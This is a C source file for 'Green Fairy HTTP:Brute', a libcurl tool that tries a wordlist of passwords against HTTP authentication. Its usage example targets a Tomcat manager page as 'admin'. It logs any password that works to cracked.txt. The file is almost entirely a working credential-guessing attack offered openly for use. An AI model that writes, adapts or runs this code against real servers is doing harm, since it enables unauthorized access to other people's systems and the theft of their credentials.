/*


        |\    o""O, /\/\ \ .
         \|   (..< B /  ) | )
          \\__|\-| {/  _| '
           \__| `||/\,-
        _____ '((: \ \      ___
   __--- o . ---__  )|     >_-
 _-.  O   o   . o -=/ )-_ //
(_---___________---_)_____/
       /vwwwv\     \  |
        |   |       \ \___
    ____|   |  _     \c_-.\
   |/ \ \   |/| \         \>
_|___\_\ \__\_|__.__/~__dh_____

Green Fairy HTTP:Brute
=======================

coded by Cooler_
c00f3r@gmail.com

exemplo com tomcat

apt-get install  libcurl-dev
gcc -o code code.c -lcurl                                          
./fairy http://tomcat/manager/html Manager lista.txt admin
                                       |     |           |_login
                                       |     \_wordlist
                                       \_Dork de busca para constar se quebrou a senha
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>

//onde ficara as senhas 
#define log "cracked.txt"
#define BUF 1024 

// Colors Macros
#define WHITE1 "[0m"
#define RED "[1;31m"
#define GREEN "[1;32m"

struct MemoryStruct {
  char *memory;
  size_t size;
};

void help()
{
 puts(
  "green fairy HTTP BRUTE v0.01\n"
  "./code url dork list.txt login\n"
  " ------------------------------------\n"
  " by Cooler_ , BugSec Team , contact: c00f3r[at]gmail[dot]com\n"
 );
}
 
static size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *data) 
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)data;
  mem->memory = realloc(mem->memory, mem->size + realsize + 1);
  if(mem->memory) 
  {
    memcpy(&(mem->memory[mem->size]), ptr, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
  }
  return realsize;
}


int main(int argc, char ** argv)
{
 FILE *fp;
 char str[BUF],busca[BUF],lista[BUF],URL[BUF],login[BUF],auth[BUF];

  struct MemoryStruct chunk;

  CURL *curl_handle;  
  curl_global_init(CURL_GLOBAL_ALL); 

 if(argc<4) 
 {
  help();    
  return 0;    
 }    

 strncpy(URL,argv[1],BUF);
 strncpy(busca,argv[2],BUF);
 strncpy(lista,argv[3],BUF);
 strncpy(login,argv[4],BUF);

  fp = fopen(lista, "r");
    if(!fp) return 1;
 
  while(fgets(str,sizeof(str),fp) != NULL) 
  {
   chunk.memory=NULL; 
   chunk.size = 0;  
   int len = strlen(str)-1;
  
    if(str[len] == '\n') 
     str[len] = 0;

   fprintf(stdout,"%s %s  ",GREEN,URL);
// login:pass , concatena... para auth
   strncpy(auth,login,BUF);
   strncat(auth,":",BUF);
   strncat(auth,str,BUF);
   fprintf(stdout,"try %s ...",auth);

   curl_handle = curl_easy_init();
   curl_easy_setopt(curl_handle, CURLOPT_URL, URL);
   curl_easy_setopt(curl_handle, CURLOPT_HTTPAUTH, (long)CURLAUTH_ANY);
   curl_easy_setopt(curl_handle, CURLOPT_USERPWD, auth);
   curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
   curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);
   curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 ");
   curl_easy_perform(curl_handle);
   curl_easy_cleanup(curl_handle);
 //log     fprintf(stdout,"%s \x0a",chunk.memory);
   
   fprintf(stdout,"find by %s %s\n",busca,WHITE1);

    if(chunk.memory && strstr(chunk.memory,busca)!=NULL) 
    {
     FILE *arq;
     fprintf(stdout,"%s String Found !%s \n",RED,WHITE1); 
     arq=fopen(log,"a"); 
     if(!arq) 
      exit(1); 
     fprintf(arq,"URL: %s \n login: %s  PASSWORD: %s\n",URL,login,str); 
     fclose(arq);
     break; 
    }

    if(chunk.memory) 
     free(chunk.memory);

   curl_global_cleanup();
  }

  fprintf(stdout,"\n--------------\n Search the end,see the file cracked.txt \t\t");
  fclose(fp);
  return 0;
}

